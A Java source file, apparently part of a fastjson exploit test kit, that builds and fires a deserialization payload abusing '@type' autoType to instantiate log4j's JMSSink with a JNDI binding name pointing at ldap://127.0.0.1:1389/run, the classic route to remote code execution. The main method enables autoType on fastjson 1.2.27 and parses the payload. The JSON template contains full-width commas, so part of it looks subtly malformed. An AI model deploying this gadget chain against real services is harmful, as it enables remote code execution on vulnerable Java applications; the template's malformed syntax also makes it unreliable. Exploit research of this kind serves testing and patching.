package fastjsonExp;

import org.apache.log4j.net.JMSSink;
import utils.FastjsonVersionCtr;
import utils.StringUtils;

/**
 * org.apache.log4j.net.JMSSink
 * still work at fastjson ???
 */
public class EXP4log4j {


    // org.apache.log4j.net.JMSSink  String payload="{\"@type\":\"org.apache.log4j.net.JMSSink\",\"tcfBindingName\":\"ldap://127.0.0.1:1389/run\"}";
    //payload="{\"@type\":\"org.apache.log4j.net.JMSSink\",\"tcfBindingName\":\"replace_here\"}";
    public String JNDI_URL = "";
    public String payload = "{\"@type\":\"org.apache.log4j.net.JMSSink\",\"tcfBindingName\":\"replace_here\"，\"topicBindingName\":\"replace_here\"，\"username\":\"\"，\"password\":\"\"}";
    public  void actual_fun(String url){
        JMSSink jmsSink = new JMSSink(url,url,null,null);

    }
    public  void actual_fun(){
        if(!StringUtils.isNull(this.JNDI_URL)){
            actual_fun(this.JNDI_URL);
        }
    }
    public EXP4log4j(){}
    public EXP4log4j(String uri){
        this.JNDI_URL = uri;
        this.payload = this.payload.replace("replace_here",uri);
        System.out.println(this.payload);
    }
    public String getPayload(){
        return this.payload;
    }
    public static void main(String[] args) throws Exception{
        FastjsonVersionCtr myFastjson = new FastjsonVersionCtr("1.2.27");
        myFastjson.mySetAutoType(true);
        EXP4log4j exp = new EXP4log4j("ldap://127.0.0.1:1389/run");
        myFastjson.myParseObject(exp.getPayload());
        //exp.actual_fun();
        myFastjson.clear();
    }
}
